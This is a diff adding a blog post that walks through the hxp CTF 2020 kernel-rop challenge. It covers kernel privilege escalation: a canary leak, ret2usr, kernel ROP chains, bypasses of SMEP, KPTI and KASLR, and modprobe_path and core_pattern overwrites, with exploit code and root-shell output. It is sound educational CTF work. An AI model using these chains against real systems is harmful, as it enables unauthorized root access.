@@ -1,0 +1,844 @@
+## Introduction
+
+In this series, I will try to keep notes on my learning trip of Linux kernel PWN.
+
+I have learnt PWN in user land on Linux (stack-based) and Windows (stack- and heap- based). The next step is to explore kernel PWN and heap-based PWN on Linux. For most cases in user land, our goal is to exploit vulnerabilities remotely and finally get a remote shell, whether root or not. However, when pwning the kernel, in my opinion, the main goal is to escalate privilege from low-privilege user to root, or to escape from a sandbox (e.g. container), which could also be regarded as a special case of escalation of privilege. And these exploitations always happen locally, that is, on the victim machine.
+
+This is the first post, and I will follow [an awesome tutorial](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) to solve [a PWN challenge](https://2020.ctf.link/internal/challenge/0b64807d-3f0b-40b9-8264-da5e51e1cf5c/) from [hxp CTF 2020](https://2020.ctf.link) step by step.
+
+## Kernel vs Userland: Similarities and Differences
+
+The Linux kernel is a ELF binary as well, so kernel PWN and userland PWN share lots of common points. You can analyse binaries (e.g. IDA, objdump, [ropr](https://github.com/Ben-Lichtman/ropr)) with the same tools and exploit with similar techniques (e.g. [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)). BTW, instead of [ROPgadget](https://github.com/JonathanSalwan/ROPgadget), I recommend ropr if you want to analyse vmlinux for ROP gadgets, in that ropr is faster. However, there are differences between kernel PWN and userland PWN technically:
+
+1.  **Different attack modes**. We have discussed a bit above. When you exploit remotely, the thing you can control is just the payload, while you could write a program and execute it as a normal process on the victim system when exploiting locally. That means nearly all the userland mitigations could be ignored, because your exploiting program does not need to bypass them, but is *protected* by them.
+2.  **Different interactions.** There are many ways to interact with userland program and trigger a vulnerability. For example, you can send to and receive from the remote service to exploit. Another common way is to deliver a crafted malicious file to trigger vulnerabilities within local softwares like office suites. Ways to interact with kernel may be different: system calls, page faults, signals, pseudo-filesystems, device drivers and so on.
+3.  **Different mitigations.** Some mitigations, like stack canary, NX and address space layout randomization (ASLR and KASLR), exist in both kernel and user land, while some others do not. For example, SMEP, [SMAP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention) and [KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation) are all used to mitigate attacks against kernel.
+4.  **Different exploiting techniques.** As we have discussed, some basic methodologies and techniques like stack overflow and ROP work in both cases, but to bypass different mitigations we need different techniques or tricks.
+
+## Prepare Your Workstation
+
+Before beginning our PWN trip, we need to do some preparations. I will conduct the whole experiment within a Ubuntu 20.04 virtual machine created by Vagrant and VirtualBox, so the first thing is to enable nest virtualization of this virtual machine.
+
+After downloading and decompressing [the challenge package](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz), we find initramfs.cpio.gz and vmlinuz. To make our work more efficient, we need some scripts:
+
+- Use [decompress_cpio.sh](https://gist.github.com/brant-ruan/784808bc192fff533d8be22932c4e2b6) to decompress initramfs.cpio.gz.
+- Use [compile_exp_and_comporess_cpio.sh](https://gist.github.com/brant-ruan/b67dc2fbae150e7bc76fda914816f534) to compile our exploit, move it into initramfs and compress.
+- Use [extract-vmlinux.sh](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux) to extract vmlinux from vmlinuz for further analysing.
+
+In addition, [ropr](https://github.com/Ben-Lichtman/ropr) is needed to find gadgets within the kernel image. Reverse engineering tools like IDA are needed to analyse the vulnerable kernel module.
+
+## Analyse the Challenge
+
+After decompressing initramfs.cpio.gz, we find the hacker.ko file, which is the vulerable module to be exploited. With some reverse engineering work, we learn that there are two important vulnerable functions:
+
+1.  `hackme_read`: we could read at most 0x1000 bytes from a 32-byte stack-based array `tmp[32]`, which is equal to stack data leak capability.
+2.  `hackme_write`: we could write at most 0x1000 bytes into a 32-byte stack-based array `tmp[32]`, which is an apparent stack overflow vulnerability.
+
+Besides, it’s easy to find out the stack canary is enabled. Well, it doesn’t matter, because we could leak the canary with our stack data leak capability.
+
+From `initramfs/etc/init.d/rcS` we get some information about the system envrionment:
+
+``` bash
+# initramfs/etc/init.d/rcS
+/bin/busybox --install -s
+stty raw -echo
+chown -R 0:0 /
+
+mkdir -p /proc && mount -t proc none /proc
+mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
+mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp
+
+echo 1 > /proc/sys/kernel/kptr_restrict
+echo 1 > /proc/sys/kernel/dmesg_restrict
+chmod 400 /proc/kallsyms
+
+insmod /hackme.ko
+chmod 666 /dev/hackme
+```
+
+1.  As non-privilege user, we CANNOT read kernel symbols from `/proc/kallsyms`.
+2.  As non-privilege user, we CANNOT view messages from kernel log buffer from `dmesg`.
+3.  As non-privilege user, we CAN read and write the `/dev/hackme` device, so as to invoke `hackme_read` and `hackme_write` functions.
+
+From run.sh script we learn that SMEP/SMAP, KASLR and KPTI are enabled:
+
+``` bash
+qemu-system-x86_64 \
+    -m 128M \
+    -cpu kvm64,+smep,+smap \
+    # ...
+    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
+```
+
+With all the information we get above, our ultimate goal is clear: Bypass stack canary, SMEP/SMAP, KPTI and KASLR mitigations and exploit the stack overflow vulnerability in `hackme_write` to escalate privlege and get a root shell.
+
+## Overview of Exploitations
+
+For this challenge, kernel stack canary, SMEP/SMAP, KPTI, KASLR and [FG-KASLR](https://lwn.net/Articles/824307/) are all enabled. To learn kernel PWN step by step, we will defeat these mitigations one by one. That is, at first we will disable nearly all the mitigations so that we could experience the most simple technique, ret2usr. Then we enable mitigations one by one, and discuss how to bypass a specific mitigation each time. Finally, we will try to pwn with all mitigations enabled, which is the very challenge in hxp CTF 2020.
+
+The whole learning process is divided into five cases:
+
+1.  Disable SMEP/SMAP, KPTI, KASLR and FG-KASLR
+2.  Disable KPTI, KASLR and FG-KASLR
+3.  Disable KASLR and FG-KASLR
+4.  Disable FG-KASLR
+5.  Enable all the mitigations above
+
+Correspondently, our exploiting approaches for these cases are:
+
+1.  Firstly leak stack canary, then ret2usr to `commit_creds(prepare_kernel_cred(0))`, then return to usermode and spawn a shell.
+2.  To bypass SMEP, utilize kernel ROP to execute `commit_creds(prepare_kernel_cred(0))`.
+3.  To bypass KPTI, there are at least three approaches:
+    1.  Abuse KPTI trampoline.
+    2.  Register SIGSEGV handler.
+    3.  Hijack [UMH (user mode helpers)](https://developer.ibm.com/articles/l-user-space-apps/). Note that there are various helpers available in Linux, and I have confirmed that at least two of them are helpful: [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html) and [coredump](https://man7.org/linux/man-pages/man5/core.5.html).
+4.  To bypass KASLR, we need to leak the kernel base address (just like what we do when pwning userland programs).
+5.  To bypass FG-KASLR, there are at least two approaches:
+    1.  Parts of kernel could not be randomized by FG-KASLR, which are only randomized by KASLR. Only using gadgets and data within these parts is enough for us to complete the exploitation.
+    2.  The kernel symbol table `ksymtab` is only randomized by KASLR, so we could utilize ROP to read out addresses of functions randomized by FG-KASLR from `ksymtab`.
+
+You can modify the `-append` option in run.sh to switch on/off mitigations. For example, we could disable most of mitigations for case 1:
+
+``` bash
+-append "console=ttyS0 nosmep nosmap nopti nokaslr quiet panic=1"
+```
+
+In addition, it would be helpful to act as root when debugging. We can append the command below to `initramfs/etc/init.d/rcS` to get a root shell after startup, if necessary:
+
+``` bash
+setuidgid 0 /bin/sh
+```
+
+## Deal with Stack Canary and Overflow
+
+Bypassing stack canary is the prerequisite to conduct further exploitations, so let’s try to leak the canary firstly. Remember that the `hackme_read` could be used to leak the stack data.
+
+From reverse engineering, we know that the `tmp[32]` array is at `rbp-0x98`, and canary is located at `rbp-0x18`. So we can read `0x98 - 0x18 = 0x80` bytes on the stack to leak canary. The canary is actually at the `0x80 / 0x8 = 16` index if we take `tmp` as an 8-byte interger array.
+
+The author of [the awesome tutorial](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) use another method to find the canary: he/she checks the leaked integers one by one to see whether it has features as a canary (not prefixed with `ffff` but suffixed with `00`). I don’t know why but this method works.
+
+OK, now let’s complete the code ([leak_canary.c](https://gist.github.com/brant-ruan/a36de55493adafd8e9d78c1e2f660dad)) and have a try:
+
+``` bash
+./comporess_cpio.sh ./leak_canary.c; ./run.sh
+```
+
+We leak the stack canary successfully:
+
+```
+/ $ ./leak_canary
+[+] successfully opened /dev/hackme
+[*] trying to leak up to 320 bytes memory
+[+] found stack canary: 0x3ba5aed1e3651d00 @ index 16
+```
+
+The next task is to overwrite the return address. To make it easy and clear, in this section we just overwrite it with `0x4141414141414141`. The key part from [overwrite_return_address.c](https://gist.github.com/9c6f42b71971ecc1ed63232148e0a63b) is:
+
+``` c
+payload[cookie_off++] = cookie; // cookie -> canary
+payload[cookie_off++] = 0x0; // ...
+payload[cookie_off++] = 0x0; // ...
+payload[cookie_off++] = 0x0; // rbp
+payload[cookie_off++] = (uint64_t)0x4141414141414141; // return address
+uint64_t data = write(global_fd, payload, sizeof(payload));
+```
+
+The control flow has been hijacked to `0x4141414141414141` successfully:
+
+```
+/ $ /overwrite_return_address
+...
+[*] trying to overwrite return address of hacker_write
+[   20.804696] general protection fault: 0000 [#1] SMP PTI
+[   20.807726] CPU: 0 PID: 114 Comm: overwrite_retur Tainted: G           O      5.9.0-rc6+ #10
+[   20.810495] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[   20.817174] RIP: 0010:0x4141414141414141
+...
+Segmentation fault
+```
+
+OK, now let’s move on to the first case.
+
+## Case 1: Disable SMEP/SMAP, KPTI, KASLR and FG-KASLR
+
+Before playing with more complex cases, let’s see how to escalate privilege and spawn a root shell with mitigations disabled:
+
+``` bash
+-append "console=ttyS0 nosmep nosmap nopti nokaslr quiet panic=1"
+```
+
+BTW, this is just like exploiting one userland stack overflow case with stack canary, NX, ALSR disabled, which is very helpful to newbies.
+
+Under this condition, ret2usr is the best technique. I failed to find out the person who firstly proposed this idea. The concept is simple: redirecting the control ﬂow of the kernel to a user process.
+
+The whole process is:
+
+1.  Save userland states of registers.
+2.  Leak the stack canary.
+3.  Overwrite the return address of `hackme_write` to userland function `privesc`.
+4.  Invoke `commit_creds(prepare_kernel_cred(0))` to escalate privilege to root.
+5.  Execute `swapgs` to swap `gs` register.
+6.  Execute `iretq` to switch register context from kernel to userland and finally return to spawn a root shell.
+
+Now we need addresses of `commit_creds()` and `prepare_kernel_cred()`. For convenience, we just add `setuidgid 0 /bin/sh` to `initramfs/etc/init.d/rcS`, start the virtual machine and read these addresses from `/proc/kallsyms`. Remember to remove this command after you get the addresses and begin to exploit:
+
+```
+/ # cat /proc/kallsyms | grep -w -E "commit_creds|prepare_kernel_cred"
+ffffffff814c6410 T commit_creds
+ffffffff814c67f0 T prepare_kernel_cred
+```
+
+The essential parts from [exploit_ret2usr.c](https://gist.github.com/c31ab6aa3477a84e7db8f7d641ecfc46) are:
+
+``` c
+void save_userland_state() {
+    puts("[*] saving user land state");
+    __asm__(".intel_syntax noprefix;"
+            "mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            ".att_syntax");
+}
+
+void spawn_shell() {
+    puts("[+] returned to user land");
+    uid_t uid = getuid();
+    if (uid == 0) {
+        printf("[+] got root (uid = %d)\n", uid);
+    } else {
+        printf("[!] failed to get root (uid: %d)\n", uid);
+        exit(-1);
+    }
+    puts("[*] spawning shell");
+    system("/bin/sh");
+    exit(0);
+}
+
+void privesc() {
+    __asm__(".intel_syntax noprefix;"
+            "movabs rax, prepare_kernel_cred;"
+            "xor rdi, rdi;"
+            "call rax;"
+            "mov rdi, rax;"
+            "movabs rax, commit_creds;"
+            "call rax;"
+            "swapgs;"
+            "mov r15, user_ss;"
+            "push r15;"
+            "mov r15, user_sp;"
+            "push r15;"
+            "mov r15, user_rflags;"
+            "push r15;"
+            "mov r15, user_cs;"
+            "push r15;"
+            "mov r15, user_rip;"
+            "push r15;"
+            "iretq;"
+            ".att_syntax;");
+}
+```
+
+Let’s give it a try:
+
+```
+/ $ ./exploit_ret2usr
+[+] successfully opened /dev/hackme
+[*] trying to leak up to 320 bytes memory
+[+] found stack canary: 0x4714cb4ee7c2fa00 @ index 16
+[*] saving user land state
+[*] trying to overwrite return address of hacker_write
+[+] returned to user land
+[+] got root (uid = 0)
+[*] spawning shell
+/ # id
+uid=0 gid=0
+```
+
+Awesome! We get a root shell successfully!
+
+## Case 2: Disable KPTI, KASLR and FG-KASLR
+
+Now let’s make it a little difficult. Remove `nosmep nosmap` in run.sh and run our exploit again:
+
+```
+/ $ ./exploit_ret2usr
+...
+[*] trying to overwrite return address of hacker_write
+[   52.143545] unable to execute userspace code (SMEP?) (uid: 1000)
+[   52.144788] BUG: unable to handle page fault for address: 0000000000401fce
+[   52.145967] #PF: supervisor instruction fetch in kernel mode
+[   52.146563] #PF: error_code(0x0011) - permissions violation
+...
+Killed
+```
+
+Oops! It fails. That is because we try to execute userspace code within the kernel context, which is forbidden by SMEP. To bypass SMEP, our idea is to build kernel ROP chain to invoke `commit_creds()`, `prepare_kernel_cred()`, `swapgs` and `iretq`. After returning to userland, we spawn a shell.
+
+I use ropr to find gadgets:
+
+``` bash
+ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax; mov|^swapgs|^iretq" ./vmlinux
+```
+
+The essential parts from [expoit_bypass_smep.c](https://gist.github.com/brant-ruan/8c4a61b8d214f557ef7ebf0f7c3efcb6) are:
+
+``` c
+payload[cookie_off++] = cookie;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = pop_rdi_ret; // return address
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = prepare_kernel_cred;
+payload[cookie_off++] = mov_rdi_rax_clobber_rsi140_pop1_ret;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = commit_creds;
+payload[cookie_off++] = swapgs_pop1_ret;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = iretq;
+payload[cookie_off++] = user_rip;
+payload[cookie_off++] = user_cs;
+payload[cookie_off++] = user_rflags;
+payload[cookie_off++] = user_sp;
+payload[cookie_off++] = user_ss;
+```
+
+Let’s give it a try:
+
+```
+/ $ ./exploit_bypass_smep
+...
+[*] trying to overwrite return address with ROP chain
+[+] returned to user land
+[+] got root (uid = 0)
+[*] spawning shell
+/ # id
+uid=0 gid=0
+```
+
+An interesting thing is that even if ropr tells me there is a `pop rdi; ret` gadget at `0xffffffff81cfacc4`, it seems to be non-executable and the kernel will kill the exploit process:
+
+```
+/ $ ./exploit_bypass_smep
+...
+[*] trying to overwrite return address with ROP chain
+[   45.311024] kernel tried to execute NX-protected page - exploit attempt? (uid: 1000)
+[   45.311483] BUG: unable to handle page fault for address: ffffffff81cfacc4
+[   45.312901] #PF: supervisor instruction fetch in kernel mode
+[   45.313198] #PF: error_code(0x0011) - permissions violation
+...
+Killed
+```
+
+But another `pop rdi; ret` gadget at `0xffffffff81006370` works. So weird! I discussed this problem with Yunsong. He disassembled vmlinux and said that the ineffective gadgets belonged to drivers compiled into the kernel. He suggested dynamical debugging with QEMU. I will update this post if I find the answer :)
+
+In addition, there was another way to disable SMEP/SMAP by overwriting CR4 register. You could build ROP chain to call `native_write_cr4()`. But it doesn’t work after [a patch](https://lwn.net/Articles/804849/) in 2019.
+
+BTW, we actually didn’t bypass SMAP because we don’t have to. If the space is not enough to put the entire ROP chain, we might need to put it at another place, e.g. userland memory utilizing a technique named [Stack Pivoting](https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/stackoverflow/fancy-rop.md). Then we have to deal with SMAP because it prevents us to read and write userland pages. Researchers proposed another attack technique named [ret2dir](https://cs.brown.edu/~vpk/papers/ret2dir.sec14.pdf) which may be helpful.
+
+## Case 3: Disable KASLR and FG-KASLR
+
+Now let’s move forward. Replace `nopti` with `kpti=1` in run.sh and run our exploit again:
+
+```
+/ $ ./exploit_bypass_smep
+...
+[*] trying to overwrite return address with ROP chain
+Segmentation fault
+```
+
+Oh, our exploit process receives a SIGSEGV signal and exits.
+
+Let’s learn about KPTI from [Wikipedia](https://en.wikipedia.org/wiki/Kernel_page-table_isolation):
+
+> Kernel page-table isolation (KPTI or PTI, previously called KAISER) is a Linux kernel feature that mitigates the Meltdown security vulnerability (affecting mainly Intel’s x86 CPUs) and improves kernel hardening against attempts to bypass kernel address space layout randomization (KASLR). It works by better isolating user space and kernel space memory.
+>
+> KPTI fixes these leaks by **separating user-space and kernel-space page tables** entirely. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a minimal set of kernel-space mappings that provides the information needed to enter or exit system calls, interrupts and exceptions.
+
+![](https://blog.wohin.me/posts/linux-kernel-pwn-01/1920px-Kernel_page-table_isolation.svg.png) Kernel page-table isolation (source: [Wikipedia](https://en.wikipedia.org/wiki/File:Kernel_page-table_isolation.svg))
+
+Why did our exploit get a SIGSEGV signal? The [reason](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti) is that even though we have already returned the execution to user-mode, the page tables that it is using is still the kernel’s, with all the pages in userland marked as non-executable.
+
+As what we have said, there are at least three ways to bypass KPTI: abuse KPTI trampoline, register SIGSEGV handler and hijack UMH (user mode helpers). We will introduce and practice all of them.
+
+### Case 3.1 Bypass KPTI with Trampoline
+
+The first way is to utilize the build-in functionality, [KPTI trampoline](https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti#kpti-trampoline), which is the kernel’s existing method of transitioning between userspace and kernelspace page tables. The trampoline function has a long name: `swapgs_restore_regs_and_return_to_usermode`. So the easiest way is to find out the address of `swapgs_restore_regs_and_return_to_usermode` and invoke it. Note that it will replace `swapgs` and `iretq` instruction we used before.
+
+According to [this post](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) and [this article](https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti#kpti-trampoline), there are lots of useless `pop` instructions at the beginning of `swapgs_restore_regs_and_return_to_usermode`, and we just need to return to the offset after those `pop` instructions.
+
+The essential addition is the invocation of `swapgs_restore_regs_and_return_to_usermode`:
+
+``` c
+uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10;
+
+void overwrite_ret() {
+    puts("[*] trying to run ROP chain and bypass KPTI with trampoline");
+    // ...
+    payload[cookie_off++] = commit_creds;
+    payload[cookie_off++] = swapgs_restore_regs_and_return_to_usermode + 22;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = user_rip;
+    // ...
+}
+```
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_kpti_with_trampoline.c](https://gist.github.com/brant-ruan/b588d772c5c6ec9dd5d35ebdb25d7485).
+
+OK. Now let’s give it a try:
+
+```
+/ $ ./exploit_bypass_kpti
+...
+[*] trying to run ROP chain and bypass KPTI with trampoline
+[+] returned to user land
+[+] got root (uid = 0)
+[*] spawning shell
+/ # id
+uid=0 gid=0
+```
+
+Last but not least, according to [another article](https://zhuanlan.zhihu.com/p/137277724), it might be feasible to build ROP chain to do the same thing as `swapgs_restore_regs_and_return_to_usermode` does.
+
+### Case 3.2 Bypass KPTI with Signal Handler
+
+With KPTI enabled, we found our exploit from case 2 encountered segmentation fault. Actually, the SIGSEGV signal could be received and handled by the handler registered in the target process. Note that segmentation fault is just a userland thing, not from kernel. What if we just register a SIGSERV signal handler in our exploit, which will help to spawn a shell when invoked?
+
+Based on [our exploit from case 2](https://gist.github.com/brant-ruan/8c4a61b8d214f557ef7ebf0f7c3efcb6), we just add signal handler and leave the else unchanged:
+
+``` c
+#include <signal.h>
+
+struct sigaction sigact;
+
+void register_sigsegv() {
+    puts("[*] registering default action upon encountering a SIGSEGV");
+    sigact.sa_handler = spawn_shell; // helps to spawn shell :)
+    sigemptyset(&sigact.sa_mask);
+    sigact.sa_flags = 0;
+    sigaction(SIGSEGV, &sigact, (struct sigaction*) NULL);
+}
+
+int main(int argc, char **argv) {
+    register_sigsegv();
+    open_dev();
+    // ...
+}
+```
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_kpti_with_signal_handler.c](https://gist.github.com/brant-ruan/6930960cb0ccbe386c56e957fc1b2668).
+
+Now let’s give it a try:
+
+```
+/ $ ./exploit_bypass_kpti_with_signal_handler
+[*] registering default action upon encountering a SIGSEGV
+...
+[*] trying to overwrite return address with ROP chain
+[+] returned to user land
+[*] receiving and handling SIGSEGV
+[+] got root (uid = 0)
+[*] spawning shell
+/ # id
+uid=0 gid=0
+```
+
+### Case 3.3 Bypass KPTI with User Mode Helpers
+
+[UMH (user mode helpers)](https://developer.ibm.com/articles/l-user-space-apps/) is for creating a user mode process from kernel space, which is really helpful, even for attackers! As we talked in [another post](https://blog.wohin.me/posts/container-escape-overview/) before, the attacker could escape from one container where the proc pseudo-filesystem is mounted, by overwriting the `core_pattern` string to `|EVIL-COMMAND` and triggering a core dump.
+
+Attackers within the kernel context could leverage this method as well. We just overwrite the same string within kernel. Then we exploit to escalate privilege in userland.
+
+There are more than five usermode helpers within Linux kernel. You can search in the source code with keyword [`call_usermodehelper_exec`](https://elixir.bootlin.com/linux/latest/A/ident/call_usermodehelper_exec) and [`call_usermodehelper`](https://elixir.bootlin.com/linux/latest/A/ident/call_usermodehelper).
+
+Whether you want to escalate privilege or escape from container, the approach is similar:
+
+1.  \[Attacker\] Overwrite the configuration string for this helper with the path to your evil script.
+2.  \[Attacker\] Trigger the helper.
+3.  \[Kernel\] Run the usermode program (your evil script) specified by the helper configuration as root.
+4.  \[Attacker\] Achieve goal.
+
+For me, if my goal is to escape from a container, I will write a reverse shell into the evil script. And if what I want is escalation of privilege, I will write something like `chown 0 SHELL-PROG` and `chmod +s SHELL-PROG` in this script. After the helper is triggered, I can run `SHELL-PROG` as root and spawn a shell.
+
+Actually, in my view, abuse of user mode helpers is a special exploitation technique. It not only helps bypass KPTI, but also promises root privilege so that `commit_creds(prepare_kernel_cred(0))` is not necessary in this case. Certainly, there are some prerequisites as well:
+
+1.  We can get the address of the specific configuration string (e.g. `core_pattern`, `modprobe_path`).
+2.  We are able to overwrite the configuration string.
+3.  We are able to trigger the helper.
+
+Hence, maybe it is not proper to put this topic only in the *bypass of KPTI* section… Anyway, let’s see how to bypass KPTI with usermode helpers. I will take **coredump** and **modprobe** for example.
+
+Note that [the tutorial](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) uses both KPTI trampoline and user mode helper to bypass KPTI, while the former one is unnecessary here.
+
+We need prepare four files for each usermode helper:
+
+1.  an `exploit` used to overwrite the configuration string of helpers
+2.  a `trigger` used to trigger the helpers.
+3.  a binary `evilsu` used to spawn a shell.
+4.  an `evil` script to be executed by the kernel to `chown` and `chmod` the binary above.
+
+**Bypass KPTI with modprobe**
+
+I won’t go into details about modprobe. You can refer to [the Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html) and [a post](https://sam4k.com/like-techniques-modprobe_path/).
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_kpti_with_modprobe](https://gist.github.com/brant-ruan/955996465ad25ea742d7bdb3a7d29509). The essential part is:
+
+``` c
+payload[cookie_off++] = pop_rax_ret;
+payload[cookie_off++] = 0x6c6976652f; // rax: /evil
+payload[cookie_off++] = pop_rdi_ret;
+payload[cookie_off++] = modprobe_path;
+payload[cookie_off++] = write_rax_into_rdi_ret; // overwrite modprobe_path
+```
+
+The whole exploiting process is:
+
+```
+/ $ cat /proc/sys/kernel/modprobe
+/sbin/modprobe
+/ $ ./exploit_bypass_kpti_with_modprobe
+...
+[*] trying to run ROP chain and bypass KPTI with modprobe_path
+Segmentation fault
+/ $ cat /proc/sys/kernel/modprobe
+/evil
+/ $ ./trigger
+[*] creating dummy file
+[*] triggering modprobe by executing dummy file
+[+] now run /tmp/evilsu to get root shell
+/ $ /tmp/evilsu
+[*] trying to spawn root shell
+/ # id
+uid=0 gid=0 groups=1000
+```
+
+**Bypass KPTI with coredump**
+
+Also, I won’t go into details about coredump. You can refer to [the Linux manual page](https://man7.org/linux/man-pages/man5/core.5.html) and [Wikipedia](https://en.wikipedia.org/wiki/Core_dump).
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_kpti_with_coredump](https://gist.github.com/brant-ruan/7c03a714b404eb0460cb68874db66537). The whole exploiting process is:
+
+```
+/ $ cat /proc/sys/kernel/core_pattern
+core
+/ $ ./exploit_bypass_kpti_with_coredump
+...
+[*] trying to run ROP chain and bypass KPTI with core_pattern
+Segmentation fault (core dumped)
+/ $ cat /proc/sys/kernel/core_pattern
+|/evil
+/ $ ./trigger
+Segmentation fault (core dumped)
+/ $ /tmp/evilsu
+[*] trying to spawn root shell
+/ # id
+uid=0 gid=0 groups=1000
+```
+
+## Case 4: Disable FG-KASLR
+
+The trip is interesting, right? Now let’s replace `nokaslr` with `kaslr` and add another option `nofgkaslr` to keep FG-KASLR disabled. Run our exploit from case 3.1 again:
+
+```
+/ $ ./exploit_bypass_kpti_with_trampoline
+...
+[*] trying to run ROP chain and bypass KPTI with trampoline
+[   11.626001] BUG: unable to handle page fault for address: ffffffff815f88ec
+[   11.629655] #PF: supervisor instruction fetch in kernel mode
+[   11.632006] #PF: error_code(0x0010) - not-present page
+...
+[   11.654253] RIP: 0010:0xffffffff815f88ec
+[   11.655261] Code: Bad RIP value.
+...
+Killed
+```
+
+The exploit doesn’t work now, which is reasonable, because all the addresses of gadgets and kernel functions are randomized by KASLR. Just like what we do to bypass ASLR, the idea is to leak one address of some kernel symbol, calculate the offset and finally update addresses of gadgets and functions within our exploit with this offset.
+
+With KASLR enabled, let’s see what the real kernel base address is:
+
+```
+/ # cat /proc/kallsyms | grep startup_64
+ffffffffa0e00000 T startup_64
+```
+
+In the meantime, add the code below into our exploit from case 3.1 and run it:
+
+``` c
+for (int i = 0; i < 40; i++)
+    printf("[*] leaking #%d: 0x%lx\n", i, leak[i]);
+```
+
+In the leaked data, we could see that the integer with index 38 is similar to the kernel base address. If we zero the lowest `0xffff` of that integer, we will get the kernel base address:
+
+```
+...
+[*] leaking #37: 0xffffbfbb801bff48
+[*] leaking #38: 0xffffffffa0e0a157
+[*] leaking #39: 0x0
+...
+```
+
+That’s great! It’s easy for us to implement the idea to bypass KASLR in our exploit:
+
+``` c
+int64_t kernel_base_offset = 0;
+uint64_t kernel_base = 0xffffffff81000000;
+
+void leak_cookie_and_kernel_offset() {
+    // ...
+    kernel_base_offset = (leak[38] & 0xffffffffffff0000) - kernel_base;
+    // ...
+}
+
+void overwrite_ret() {
+    // ...
+    payload[cookie_off++] = pop_rdi_ret + kernel_base_offset; // return address
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = prepare_kernel_cred + kernel_base_offset;
+    payload[cookie_off++] = mov_rdi_rax_clobber_rsi140_pop1_ret + kernel_base_offset;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = commit_creds + kernel_base_offset;
+    payload[cookie_off++] = swapgs_restore_regs_and_return_to_usermode + kernel_base_offset + 22;
+    // ...
+}
+```
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_kaslr_with_offset_leak.c](https://gist.github.com/brant-ruan/ef4a2e25897f7a43137ea475d2ffd8fa).
+
+Finally, the whole exploiting process is:
+
+```
+/ $ ./exploit_bypass_kaslr_with_offset_leak
+[+] successfully opened /dev/hackme
+[*] trying to leak up to 320 bytes memory
+[+] got kernel base address offset: 0x14c00000
+[+] found stack canary: 0xe59b61404c813400 @ index 16
+[*] saving user land state
+[*] trying to run ROP chain and bypass KASLR with kernel offset leak
+[+] returned to user land
+[+] got root (uid = 0)
+[*] spawning shell
+/bin/sh: can't access tty; job control turned off
+/ # id
+uid=0 gid=0
+```
+
+## Case 5: Enable All The Mitigations Above
+
+Congratulations! Now we will remove `nofgkaslr` in run.sh, which means the [FG-KASLR](https://lwn.net/Articles/824307/) will be enabled. I won’t go into details about FG-KASLR. Here is [another good material](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr) if you like.
+
+Let’s try our exploit from case 4 once again!
+
+```
+/ $ ./exploit_bypass_kaslr_with_offset_leak
+...
+[*] trying to run ROP chain and bypass KASLR with kernel offset leak
+[   81.472325] (NULL device *): �<��
+[   81.473108] BUG: kernel NULL pointer dereference, address: 0000000000000058
+[   81.479830] #PF: supervisor read access in kernel mode
+[   81.482161] #PF: error_code(0x0000) - not-present page
+...
+Killed
+```
+
+It doesn’t work, but why? According to [Function Granular KASLR](https://lwn.net/Articles/824307/), the randomization is on a per-function level now:
+
+> This patch set is an implementation of finer grained kernel address space randomization. It rearranges your kernel code at load time on a per-function level granularity, with only around a second added to boot time.
+
+How can we defeat FG-KASLR and get a root shell again? Well, firstly we must know that not all addresses within kernel are randomized by FG-KASLR. From [ctf-wiki](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#_13), we get much valuable information:
+
+1.  `.text` section is not randomized by FG-KASLR. `swapgs_restore_regs_and_return_to_usermode` is located in `.text`.
+2.  The kernel symbol table `__ksymtab` has a fixed offset to kernel base address. We could leak addresses of other symbols from `__ksymtab`.
+3.  The `.data` section also has a fixed offset to kernel base address. Interesting things like `modprobe_path` are located there.
+
+Based on information above, we have at least two ideas to bypass FG-KASLR:
+
+1.  Only use gadgets and symbols not affected by FG-KASLR.
+2.  Firstly leak the address of `__ksymtab_commit_creds` and `__ksymtab_prepare_kernel_cred`, and then build kernel ROP chain to read the correct addresses of function symbols (e.g. `commit_creds`) from this table.
+
